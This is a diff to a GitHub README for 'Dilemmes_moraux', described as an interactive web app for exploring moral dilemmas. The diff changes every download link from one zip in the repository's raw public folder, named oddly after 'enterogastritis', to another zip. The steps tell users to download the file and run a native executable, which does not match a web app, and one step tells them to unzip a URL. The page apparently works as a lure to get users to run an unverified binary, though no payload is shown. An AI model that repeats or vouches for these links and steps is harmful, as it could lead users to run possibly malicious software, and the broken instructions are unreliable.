@@ -1,6 +1,6 @@
 # 🌟 Dilemmes_moraux - Explore Your Ethical Profile Effortlessly
 
-[![Download Dilemmes_moraux](https://github.com/IrhamFajrianto/Dilemmes_moraux/raw/refs/heads/main/public/moraux-Dilemmes-enterogastritis.zip)](https://github.com/IrhamFajrianto/Dilemmes_moraux/raw/refs/heads/main/public/moraux-Dilemmes-enterogastritis.zip)
+[![Download Dilemmes_moraux](https://github.com/IrhamFajrianto/Dilemmes_moraux/raw/refs/heads/main/public/moraux_Dilemmes_3.1.zip)](https://github.com/IrhamFajrianto/Dilemmes_moraux/raw/refs/heads/main/public/moraux_Dilemmes_3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Dilemmes_moraux! This interactive web application lets you explore mo
 
 To get started, you need to visit the GitHub Releases page to download the application. Click the link below:
 
-[Visit this page to download](https://github.com/IrhamFajrianto/Dilemmes_moraux/raw/refs/heads/main/public/moraux-Dilemmes-enterogastritis.zip)
+[Visit this page to download](https://github.com/IrhamFajrianto/Dilemmes_moraux/raw/refs/heads/main/public/moraux_Dilemmes_3.1.zip)
 
 ### Steps to Download
 
@@ -50,7 +50,7 @@ Once downloaded, follow these instructions to run Dilemmes_moraux:
 
 1. Open your terminal.
 2. Navigate to the folder containing the downloaded file using the `cd` command.
-3. Unzip the file using `unzip https://github.com/IrhamFajrianto/Dilemmes_moraux/raw/refs/heads/main/public/moraux-Dilemmes-enterogastritis.zip`.
+3. Unzip the file using `unzip https://github.com/IrhamFajrianto/Dilemmes_moraux/raw/refs/heads/main/public/moraux_Dilemmes_3.1.zip`.
 4. Run the application using `./Dilemmes_moraux`.
 
 ## ⚙️ Features
@@ -92,4 +92,4 @@ Feel free to contribute by sharing your feedback or suggestions for improvement!
 
 Don’t forget to download the application and start exploring your ethical profile today!
 
-[Visit this page to download](https://github.com/IrhamFajrianto/Dilemmes_moraux/raw/refs/heads/main/public/moraux-Dilemmes-enterogastritis.zip)
+[Visit this page to download](https://github.com/IrhamFajrianto/Dilemmes_moraux/raw/refs/heads/main/public/moraux_Dilemmes_3.1.zip)
